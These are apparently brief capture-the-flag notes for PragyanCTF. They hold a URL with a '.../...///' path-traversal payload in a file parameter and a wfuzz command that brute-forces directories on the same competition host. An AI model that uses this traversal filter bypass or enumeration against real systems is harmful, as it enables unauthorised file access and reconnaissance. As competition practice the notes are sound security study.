## PragyanCTF


http://128.199.224.175:22000/?file=.../...///css/bootstrap.min.css

wfuzz -c --hc 403,400,404,405,301,302,500 -w ~/hacking/dictionaries/developer.txt http://128.199.224.175:25000/FUZZ
